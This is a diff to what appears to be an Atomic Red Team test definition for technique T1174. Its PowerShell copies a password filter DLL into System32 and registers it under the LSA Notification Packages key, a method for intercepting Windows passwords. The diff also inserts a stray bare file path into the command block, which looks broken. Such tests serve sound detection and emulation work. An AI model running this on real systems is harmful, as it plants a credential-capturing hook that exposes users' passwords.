@@ -6,6 +6,7 @@ atomic_tests:
 - name: Install and Register Password Filter DLL
   description: |
     Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
+    (Reference http://github.com/bshp/passwdhk)
 
   supported_platforms:
     - windows
@@ -14,12 +15,13 @@ atomic_tests:
     input_dll:
       description: Path to DLL to be installed and registered
       type: Path
-      default: PathToAtomicsFolder\T1174\src\AtomicPasswordFilter.dll
+      default: passwordfilter.dll
 
   executor:
     name: powershell
     elevation_required: true
     command: |
+      /atomics/T1174/bin/passwordfilter.dll
       $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
       $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
       $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
